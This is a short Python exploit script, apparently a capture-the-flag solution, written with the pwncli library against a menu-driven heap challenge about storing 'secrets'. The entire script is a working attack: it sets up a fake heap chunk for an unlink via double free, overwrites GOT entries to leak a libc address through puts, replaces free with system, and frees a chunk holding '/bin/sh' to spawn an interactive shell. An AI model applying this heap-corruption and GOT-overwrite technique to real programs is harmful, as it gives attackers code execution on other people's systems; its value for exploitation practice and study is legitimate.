from pwncli import *

cli_script()

p:tube = gift['io']
elf:ELF = gift['elf']
libc: ELF = gift['libc']

def keep(size_type:int, data:(str, bytes)):
    p.sendlineafter("3. Renew secret\n", "1")
    p.sendlineafter("2. Big secret\n", str(size_type))
    p.sendafter("Tell me your secret: \n", data)


def swip(size_type:int):
    p.sendlineafter("3. Renew secret\n", "2")
    p.sendlineafter("2. Big secret\n", str(size_type))


def renew(size_type:int, data:(str, bytes)):
    p.sendlineafter("3. Renew secret\n", "3")
    p.sendlineafter("2. Big secret\n", str(size_type))
    p.sendafter("Tell me your secret: \n", data)


def get_small(data="deadbeef\n"): keep(1, data)

def get_big(data="deadbeef\n"): keep(2, data)

def get_huge(data="deadbeef\n"): keep(3, data)

def free_small(): swip(1)

def free_big(): swip(2)

def write_small(data): renew(1, data)

def write_big(data): renew(2, data)


get_small()
get_big()

free_small()
get_huge()

free_small()

layout = [0, 0x21, 
        0x6020d0-0x18, 0x6020d0 - 0x10, 0x20]

get_small(flat(layout))

free_big()

write_small(flat(0, elf.got['puts'], 0, elf.got['free'], (1 << 32) + 1))
write_small(p64(elf.plt['puts']))

free_big()

libc_base_addr = u64(p.recvn(6) + b"\x00\x00") - libc.sym['puts']
log_address("libc_base_addr", libc_base_addr)

write_small(p64(libc.sym['system'] + libc_base_addr))

get_big("/bin/sh\x00")

free_big()

p.interactive()